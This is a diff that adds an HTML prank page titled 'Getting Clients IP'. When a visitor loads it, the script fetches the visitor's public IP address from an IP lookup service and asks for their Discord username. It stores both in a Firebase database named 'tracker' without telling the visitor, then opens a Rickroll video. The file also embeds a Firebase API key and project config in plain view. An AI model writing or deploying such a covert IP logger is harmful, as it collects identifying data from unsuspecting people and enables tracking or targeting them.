@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <style>
+        #myFrame{
+            visibility: hidden;
+        }
+		video{
+			width: 450px;
+			height: 450px;
+		}
+    </style>
+	<title>Getting Clients IP</title>
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+	<script src="https://www.gstatic.com/firebasejs/7.6.2/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/7.6.2/firebase-firestore.js"></script>
+<script src="https://www.gstatic.com/firebasejs/live/3.1/firebase.js"></script>
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/css/bootstrap.min.css">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/js/bootstrap.min.js"></script>
+<script>
+	$.getJSON("https://api.ipify.org?format=json", function(data) {
+		 $("#gfg").html(data.ip);
+		 localStorage.setItem("Hi",data.ip);
+	 })
+	NameRoom = prompt("Enter your Discord username");
+	user = localStorage.getItem("Hi");
+	const config = {
+  apiKey: "AIzaSyCBdPA42A-JtQNNDuFE45IjAiBuDBknPE4",
+  authDomain: "tracker-bac59.firebaseapp.com",
+  databaseURL: "https://tracker-bac59-default-rtdb.firebaseio.com",
+  projectId: "tracker-bac59",
+  storageBucket: "tracker-bac59.appspot.com",
+  messagingSenderId: "1055672145120",
+  appId: "1:1055672145120:web:366256c1243aec3bc32c85"
+};
+firebase.initializeApp(config);
+function getData() { firebase.database().ref("/"+NameRoom).on('value', function(snapshot) { document.getElementById("output").innerHTML = ""; snapshot.forEach(function(childSnapshot) { childKey  = childSnapshot.key; childData = childSnapshot.val(); if(childKey != "purpose") {
+         firebase_message_id = childKey;
+         message_data = childData;
+		} });  }); }
+		firebase.database().ref(NameRoom).push({
+            username : NameRoom,
+            ip_add : user,
+            value : 0
+      })
+	  window.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
+	  document.getElementsByTagName("title")[0].innerHTML = "You have been Rickrolled!";
+	</script>
+	</head>
+</html>
